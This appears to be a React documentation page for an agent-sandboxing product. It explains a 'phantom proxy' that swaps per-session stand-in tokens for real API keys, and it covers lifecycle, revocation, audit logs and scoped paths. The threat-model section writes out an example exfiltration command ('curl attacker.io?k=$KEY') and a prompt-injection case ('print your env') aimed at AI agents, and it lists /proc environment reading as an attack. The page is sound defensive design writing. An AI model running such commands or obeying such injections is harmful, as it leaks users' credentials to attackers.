import { DocPage, Section, Inline, Hint, Table } from "../../components/docs/DocPage";
import { Code } from "../../components/docs/Code";

export function Phantom() {
  return (
    <DocPage
      eyebrow="Concepts"
      title="Phantom proxy"
      lead={
        <>
          The trick that makes credential exfiltration <em>physically impossible</em>:
          the sandbox sees a per-session token like <Inline>phm_b41…</Inline>, never
          your real <Inline>sk-…</Inline>. A reverse proxy on the host swaps it at
          the edge.
        </>
      }
    >
      <Section id="threat" title="The threat model">
        <p>
          You give an agent your OpenAI key. The agent reads its environment, prints
          it back, calls <Inline>curl attacker.io?k=$KEY</Inline>, or imports a package
          that ships a malicious post-install hook. Any of these leaks the key — and
          once leaked, it's good forever (until you rotate).
        </p>
        <Table
          head={["Attack", "Why phantom-edge stops it"]}
          rows={[
            ["Prompt injection: \"print your env\"", "env contains phm_…, not the real key"],
            ["Generated code: curl attacker?k=$KEY", "phantom is useless off the proxy"],
            ["Compromised package reads /proc/*/env", "same — there's nothing real to find"],
            ["Memory-scraping exploit", "real key is not in jail memory"],
            ["Veth peer escape to proxy process", "proxy only stores active phantoms"],
          ]}
        />
      </Section>

      <Section id="lifecycle" title="Lifecycle">
        <p>One round-trip per session:</p>
        <Code lang="text">{`  ┌─────────┐  put(openai, sk-real)   ┌──────────────┐
  │  agent  │ ──────────────────────► │ control plane│  (host)
  └─────────┘                          └─────┬────────┘
                                             │ stores in postgres
       ┌──────────────────────────────┐      │
       │  sessions.create({openai})   │ ◄────┘ mints phm_<64hex>
       │  → session.env =              │
       │       OPENAI_API_KEY=phm_...  │
       │       OPENAI_BASE_URL=8443/v1 │
       └────────────────┬──────────────┘
                        ▼
                   ┌──────────┐
                   │  jail    │  fetch(\${OPENAI_BASE_URL}/chat/...)
                   └──────────┘  Authorization: Bearer phm_...
                        │
                        ▼
                  ┌────────────────┐  swap phm_… → sk-real
                  │ phantom proxy  │  forward to api.openai.com
                  └────────────────┘  log to audit table`}</Code>
      </Section>

      <Section id="lifetime" title="Lifetime and revocation">
        <p>
          Phantoms expire when the session does. Sessions die at <Inline>ttlSecs</Inline>{" "}
          or when you call <Inline>sessions.close(id)</Inline> — whichever is first.
          After that, the proxy hands back <Inline>403</Inline> for every request
          carrying the phantom; the upstream is never contacted.
        </p>
        <Code lang="ts">{`const session = await aj.sessions.create({ services: ["openai"], ttlSecs: 60 });

// ... agent runs ...

await aj.sessions.close(session.id);  // phantom now dead`}</Code>
        <Hint title="The control-plane API key is different" tone="iris">
          <Inline>AGENTJAIL_API_KEY</Inline> (the one you paste into the dashboard) is
          a static, long-lived secret you set at server boot. It does <em>not</em>{" "}
          expire — only phantoms do. Treat it like an admin token: keep it in your
          host environment, never inside a jail.
        </Hint>
      </Section>

      <Section id="audit" title="Audit log">
        <p>
          Every proxied request is recorded with timestamp, method, service, path,
          and status — readable via <Inline>audit.recent()</Inline> in the SDK or the
          Stream page in the dashboard.
        </p>
        <Code lang="ts">{`const { rows } = await aj.audit.recent({ limit: 50 });
// [{ at, status, method, service, path }, ...]`}</Code>
      </Section>

      <Section id="scopes" title="Scoped phantoms">
        <p>
          A scope is a per-service path allowlist. The proxy compares the request
          path against the globs and rejects mismatches with <Inline>403</Inline>{" "}
          before opening the upstream socket — so a phantom for{" "}
          <Inline>/repos/my-org/issues*</Inline> truly cannot list other orgs' repos.
        </p>
        <Code lang="ts">{`const session = await aj.sessions.create({
  services: ["github"],
  scopes:   { github: ["/repos/my-org/my-repo/issues*"] },
});`}</Code>
      </Section>
    </DocPage>
  );
}
